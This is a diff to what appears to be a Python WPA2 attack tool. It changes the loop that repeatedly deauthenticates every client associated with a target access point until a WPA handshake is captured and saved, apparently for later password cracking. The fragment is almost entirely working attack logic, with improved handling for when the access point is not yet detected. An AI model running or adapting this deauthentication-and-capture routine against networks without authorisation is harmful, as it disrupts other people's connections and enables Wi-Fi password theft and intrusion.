@@ -260,27 +260,27 @@ class Wpa2Attacker(object):
                 capturer = WirelessCapturer(tmp_dir=tmp_dirname, interface=self.monitoring_interface)
                 capturer.start(self.ap)
 
-                logger.debug('waiting for the capture result')
-                time.sleep(6)  # TODO(xvondr20) Refactor to wait until AP was detected.
-                # TODO(xvondr20) Refactor to improve following strategy ->
                 while not self.ap.wpa_handshake_cap_path:
                     capturer.update_state()
                     while not capturer.flags['detected_wpa_handshake']:
                         time.sleep(2)
                         capturer.update_state()
-                        tmp_ap = capturer.get_capture_result()[0]
-                        if len(tmp_ap.associated_stations) == 0:
-                            logger.debug('network is empty')
-                        # deauthenticate stations to acquire WPA handshake
-                        for st in tmp_ap.associated_stations:
-                            deauthenticate(self.monitoring_interface, st)
-                            time.sleep(2)
-                            capturer.update_state()
-                            if capturer.flags['detected_wpa_handshake']:
-                                break
+                        result = capturer.get_capture_result()
+                        if len(result):  # if AP was detected by capturer
+                            tmp_ap = capturer.get_capture_result()[0]
+                            if len(tmp_ap.associated_stations) == 0:
+                                logger.info('Network is empty.')
+                            # deauthenticate stations to acquire WPA handshake
+                            for st in tmp_ap.associated_stations:
+                                deauthenticate(self.monitoring_interface, st)
+                                time.sleep(2)
+                                capturer.update_state()
+                                if capturer.flags['detected_wpa_handshake']:
+                                    break
+                        else:
+                            logger.info('Network not detected by capturer yet.')
                     self.ap.save_wpa_handshake_cap(capturer.wpa_handshake_cap_path)
-                    logger.debug('WPA handshake detected')
-                # TODO <-
+                    logger.info('WPA handshake detected.')
                 capturer.stop()
                 capturer.clean()
 
